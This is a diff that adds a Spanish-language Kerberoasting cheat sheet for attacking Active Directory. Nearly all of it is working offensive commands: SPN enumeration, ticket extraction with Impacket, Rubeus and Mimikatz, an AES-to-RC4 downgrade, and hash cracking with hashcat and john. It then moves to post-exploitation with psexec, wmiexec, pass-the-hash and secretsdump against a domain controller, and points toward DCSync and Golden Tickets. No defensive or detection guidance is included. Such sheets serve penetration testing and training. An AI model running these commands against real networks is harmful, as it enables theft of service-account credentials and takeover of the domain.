@@ -1,0 +1,190 @@
+
+================================================================================
+KERBEROASTING CHEATSHEET
+================================================================================
+
+--------------------------------------------------------------------------------
+CONCEPTO
+--------------------------------------------------------------------------------
+Cualquier usuario del dominio puede pedir un TGS para cualquier SPN registrado.
+Ese TGS viene cifrado con el hash NTLM de la cuenta de servicio asociada.
+Si nos llevamos el ticket y lo crackeamos offline → contraseña en claro.
+
+Requisitos:
+  - Un usuario valido del dominio (sin privilegios)
+  - Que existan cuentas con SPNs registrados
+
+Por que es peligroso:
+  - Solo necesitas user del dominio con privilegios nulos
+  - Abusa de funcionalidad legitima (rara vez monitorizada)
+  - Cuentas de servicio suelen ser privilegiadas
+  - Suelen tener contraseñas debiles y predecibles
+
+--------------------------------------------------------------------------------
+FLUJO DEL ATAQUE
+--------------------------------------------------------------------------------
+
+  Usuario del dominio
+       │
+       │  1. TGS-REQ  → pide ticket para el SPN
+       ▼
+      DC (KDC)
+       │
+       │  2. TGS-REP  → devuelve ticket cifrado con hash cuenta servicio
+       ▼
+  Atacante
+       │
+       │  3. Crackeo offline del hash
+       ▼
+  Contraseña en claro → acceso al servicio / movimiento lateral
+
+--------------------------------------------------------------------------------
+IDENTIFICACION DE SPNs
+--------------------------------------------------------------------------------
+# Desde Linux (Impacket)
+impacket-GetUserSPNs <dominio>/<user>:'<pass>' -dc-ip <IP_DC>
+
+# Desde Windows (PowerView)
+Get-DomainUser -SPN | Select-Object SamAccountName, ServicePrincipalName
+
+# Desde Windows (nativo)
+setspn -T <dominio> -Q */*
+
+# Desde Windows (LDAP)
+C:\> ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,serviceprincipalname
+
+--------------------------------------------------------------------------------
+OBTENCION DE HASHES
+--------------------------------------------------------------------------------
+# Desde Linux - Impacket (lista SPNs y pide tickets)
+impacket-GetUserSPNs <dominio>/<user>:'<pass>' -dc-ip <IP_DC> -request
+
+# Guardar hash en fichero
+impacket-GetUserSPNs <dominio>/<user>:'<pass>' -dc-ip <IP_DC> -request -outputfile hashes_kerberoast.txt
+
+# Solo un usuario concreto
+impacket-GetUserSPNs <dominio>/<user>:'<pass>' -dc-ip <IP_DC> -request -usersfile usuarios.txt
+
+# Desde Windows - Rubeus (todos los SPNs)
+C:\> Rubeus.exe kerberoast
+
+# Desde Windows - Rubeus (downgrade AES a RC4)
+C:\> Rubeus.exe kerberoast /tgtdeleg
+
+# Desde Windows - Rubeus (usuario concreto)
+C:\> Rubeus.exe kerberoast /user:<cuenta_servicio>
+
+# Desde Windows - Mimikatz
+mimikatz # kerberos::list /export
+
+--------------------------------------------------------------------------------
+IDENTIFICACION DEL TIPO DE HASH
+--------------------------------------------------------------------------------
+RC4  (mas facil de crackear) → empieza por $krb5tgs$23$
+AES128                        → empieza por $krb5tgs$17$
+AES256 (mas dificil)          → empieza por $krb5tgs$18$
+
+Objetivo siempre: conseguir RC4
+Si el hash es AES → intentar downgrade con /tgtdeleg (Rubeus) o Impacket
+
+--------------------------------------------------------------------------------
+CRACKING DE HASHES
+--------------------------------------------------------------------------------
+# John the Ripper
+john --format=krb5tgs hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+john --format=krb5tgs hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --rules
+
+# Hashcat - RC4 (modo 13100)
+hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+
+# Hashcat - AES128 (modo 19600)
+hashcat -m 19600 hash.txt /usr/share/wordlists/rockyou.txt
+
+# Hashcat - AES256 (modo 19700)
+hashcat -m 19700 hash.txt /usr/share/wordlists/rockyou.txt
+
+# Ver progreso hashcat
+hashcat -m 13100 hash.txt --show
+
+--------------------------------------------------------------------------------
+DOWNGRADE AES → RC4
+--------------------------------------------------------------------------------
+# Rubeus (desde Windows)
+C:\> Rubeus.exe kerberoast /tgtdeleg
+
+# Impacket (lo intenta por defecto si RC4 no esta deshabilitado)
+impacket-GetUserSPNs <dominio>/<user>:'<pass>' -dc-ip <IP_DC> -request
+
+# Verificar si RC4 esta deshabilitado en el dominio
+# Si el hash devuelto empieza por $18 y no por $23 → RC4 deshabilitado
+
+--------------------------------------------------------------------------------
+COMPARATIVA RC4 vs AES
+--------------------------------------------------------------------------------
+             RC4 ($23)        AES128 ($17)     AES256 ($18)
+Velocidad    Rapido           Lento            Muy lento
+Seguridad    Baja             Alta             Muy alta
+Objetivo     SI               Solo si RC4      Solo si RC4
+             (preferido)      deshabilitado    deshabilitado
+
+--------------------------------------------------------------------------------
+POST-EXPLOTACION CON CREDENCIALES OBTENIDAS
+--------------------------------------------------------------------------------
+# Acceso por SMB
+impacket-psexec <dominio>/<cuenta_servicio>:'<pass_crackeada>'@<IP>
+
+# Acceso por WMI
+impacket-wmiexec <dominio>/<cuenta_servicio>:'<pass_crackeada>'@<IP>
+
+# Pass-the-Hash si no se pudo crackear pero se tiene NTLM
+impacket-psexec <dominio>/<user>@<IP> -hashes :<NTLM>
+
+# Movimiento lateral con las credenciales
+impacket-secretsdump <dominio>/<cuenta_servicio>:'<pass>'@<IP_DC>
+
+--------------------------------------------------------------------------------
+DIFERENCIAS CON ASREPROASTING
+--------------------------------------------------------------------------------
+                  KERBEROASTING           ASREPROASTING
+Objetivo          Cuentas con SPN         Cuentas sin pre-auth Kerberos
+Requisito         User del dominio        Ninguno (no auth necesaria)
+Ticket obtenido   TGS                     AS-REP
+Hash              $krb5tgs$               $krb5asrep$
+Herramienta       GetUserSPNs / Rubeus    GetNPUsers / Rubeus asreproast
+Modo hashcat      13100 (RC4)             18200
+
+# ASREPRoasting desde Impacket
+impacket-GetNPUsers <dominio>/<user>:'<pass>' -dc-ip <IP_DC> -request
+
+# ASREPRoasting desde Rubeus
+C:\> Rubeus.exe asreproast
+
+# Cracking AS-REP
+hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
+john --format=krb5asrep hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+--------------------------------------------------------------------------------
+CONTEXTO EN LA METODOLOGIA
+--------------------------------------------------------------------------------
+Fase: Compromiso interno / Acceso a credenciales
+
+  Reconocimiento
+       │
+       ▼
+  Enumeracion de SPNs  ← impacket-GetUserSPNs / Rubeus
+       │
+       ▼
+  Obtencion de TGS     ← cifrado con hash cuenta servicio
+       │
+       ▼
+  Cracking offline     ← john / hashcat
+       │
+       ▼
+  Credenciales en claro → movimiento lateral / elevacion de privilegios
+
+Posicion en el ataque:
+  - Solo necesitas un usuario del dominio para empezar
+  - Si la cuenta crackeada es admin → DCSync → Golden/Diamond Ticket
+
+================================================================================
